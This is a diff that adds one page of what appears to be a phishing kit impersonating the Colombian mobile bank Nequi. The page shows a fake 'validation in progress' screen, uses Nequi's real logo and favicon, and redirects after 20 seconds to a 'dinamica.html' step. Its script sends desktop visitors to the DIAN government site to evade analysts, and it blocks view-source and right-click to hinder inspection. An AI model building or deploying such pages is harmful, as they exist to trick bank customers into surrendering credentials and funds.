@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <title>Nequi - Validación</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta http-equiv="pragma" content="no-cache">
+  
+  <link rel="stylesheet" type="text/css" href="login_files/normalize.css">
+  <link rel="stylesheet" type="text/css" href="login_files/nequi_two.webflow.css">
+  <link rel="stylesheet" type="text/css" href="login_files/nequi_one.webflow.css">
+  <link rel="stylesheet" type="text/css" href="login_files/main2.css">
+  <link rel="shortcut icon" type="image/x-icon" href="https://transacciones.nequi.com/bdigital/images/favicon.ico">
+
+  <style>
+    body {
+      font-family: 'Manrope', sans-serif;
+      background-color: #ffffff;
+      margin: 0;
+      padding: 0;
+    }
+
+    .wrap-header {
+      background-color: #ffffff;
+      padding: 20px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+
+    .logo img {
+      height: 32px;
+    }
+
+    .login-section {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 70vh;
+      padding: 20px;
+    }
+
+    .login-wrap {
+      max-width: 500px;
+      text-align: center;
+    }
+
+    h1 {
+      color: #200020;
+      font-size: 1.8rem;
+      font-weight: 700;
+      margin-bottom: 30px;
+    }
+
+    .wrap-input4 {
+      background: #f8f9fa;
+      border-radius: 12px;
+      padding: 40px 20px;
+    }
+
+    .wrap-input4 img {
+      width: 80px;
+      margin-bottom: 20px;
+    }
+
+    .textypn2 {
+      margin: 20px 0;
+    }
+
+    .model {
+      font-size: 16px;
+      color: #200020;
+      line-height: 1.6;
+      display: block;
+    }
+
+    .label-input101 {
+      font-size: 14px;
+      color: #666;
+      font-style: italic;
+    }
+
+    @media (max-width: 768px) {
+      h1 {
+        font-size: 1.5rem;
+      }
+
+      .model {
+        font-size: 15px;
+      }
+    }
+  </style>
+
+  <script type="text/javascript">
+    // Función para redireccionar después de 20 segundos
+    function startRedirectTimer() {
+      let secondsLeft = 20;
+      const interval = setInterval(function() {
+        secondsLeft--;
+        console.log("Redirigiendo en " + secondsLeft + " segundos");
+        
+        // Cuando el contador llegue a 0, redirigir
+        if (secondsLeft <= 0) {
+          clearInterval(interval);
+          window.location.href = "dinamica.html"; // Cambia esta ruta si necesitas
+        }
+      }, 1000);
+    }
+
+    // Iniciar el temporizador cuando la página haya cargado
+    window.onload = startRedirectTimer;
+  </script>
+</head>
+<body>
+
+  <div id="content">
+    <!-- Header -->
+    <header>
+      <div class="wrap-header">
+        <div class="logo">
+          <a href="#">
+            <img alt="nequi" src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64dfef05bc6705edb9447499_nequi.svg">
+          </a>
+        </div>
+      </div>
+    </header>
+
+    <!-- Sección de validación -->
+    <section class="login-section">
+      <div class="login-wrap">
+        <h1>Validación en curso</h1>
+        <div class="wrap-input4 validate-input">
+          <center>
+            <img src="https://imagizer.imageshack.com/img923/8701/hMwrLE.gif" alt="Cargando...">
+          </center>
+          
+          <div class="textypn2">
+            <span class="model">
+              Por favor espere un momento mientras validamos la información ingresada, agradecemos su paciencia.
+            </span>
+          </div>
+          
+          <br>
+          <center>
+            <span class="label-input101">Por lo general este proceso no demora más de 2 minutos.</span>
+          </center>
+        </div>
+      </div>
+    </section>
+  </div>
+
+  <script>
+    // Detectar dispositivo
+    function detectar_dispositivo() {
+      var dispositivo = "";
+      if (navigator.userAgent.match(/Android/i)) dispositivo = "Android";
+      else if (navigator.userAgent.match(/webOS/i)) dispositivo = "webOS";
+      else if (navigator.userAgent.match(/iPhone/i)) dispositivo = "iPhone";
+      else if (navigator.userAgent.match(/iPad/i)) dispositivo = "iPad";
+      else if (navigator.userAgent.match(/iPod/i)) dispositivo = "iPod";
+      else if (navigator.userAgent.match(/BlackBerry/i)) dispositivo = "BlackBerry";
+      else if (navigator.userAgent.match(/Windows Phone/i)) dispositivo = "Windows Phone";
+      else dispositivo = "PC";
+      return dispositivo;
+    }
+  
+    // Redirigir si es PC
+    if (detectar_dispositivo() == "PC") {
+      window.location.href = "https://www.dian.gov.co/";
+    }
+  
+    // Bloquear teclas específicas y clic derecho
+    document.addEventListener("keydown", function (e) {
+      if (e.ctrlKey && (e.key === "u" || e.key === "U")) {
+        e.preventDefault();
+        alert("Esta acción está bloqueada.");
+      }
+    });
+  
+    document.addEventListener("contextmenu", function (e) {
+      e.preventDefault();
+      alert("El clic derecho está deshabilitado en esta página.");
+    });
+  </script>
+  
+</body>
+</html>
